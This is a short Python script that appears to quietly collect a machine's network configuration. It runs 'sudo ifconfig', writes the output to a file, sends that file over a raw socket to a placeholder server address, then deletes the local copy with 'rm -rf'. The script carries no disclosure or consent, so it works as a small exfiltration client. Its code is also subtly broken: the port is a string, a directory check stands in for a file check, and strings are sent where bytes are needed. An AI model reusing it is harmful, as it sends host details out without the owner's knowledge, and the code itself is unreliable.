import socket,os,time

host = "ServerIP"
port = "ServerPORT"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("EmreOvunc-Inet")
if (os.path.isdir("inet_conn.txt")):
    os.remove("inet_conn.txt")
time.sleep(1)
os.system("sudo ifconfig > inet_conn.txt")
time.sleep(1)
f = open('inet_conn.txt', 'rb')
l = f.read(1024)
while (l):
    s.send(l)
    l = f.read(1024)
f.close()
s.close()
os.system("rm -rf /home/monster/inet_conn.txt")
